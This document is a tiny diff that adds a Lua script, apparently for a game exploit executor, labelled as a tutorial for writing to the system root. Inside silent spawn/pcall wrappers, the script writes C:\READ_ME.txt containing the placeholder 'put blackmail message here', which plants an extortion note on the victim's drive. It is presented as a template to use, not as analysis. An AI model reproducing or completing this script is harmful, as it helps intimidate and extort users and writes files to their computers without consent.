@@ -1,0 +1,7 @@
+--tut on how to use in the root 
+
+spawn(function()
+    pcall(function()
+        writefile("C:\\READ_ME.txt", "put blackmail message here")
+    end)
+end)
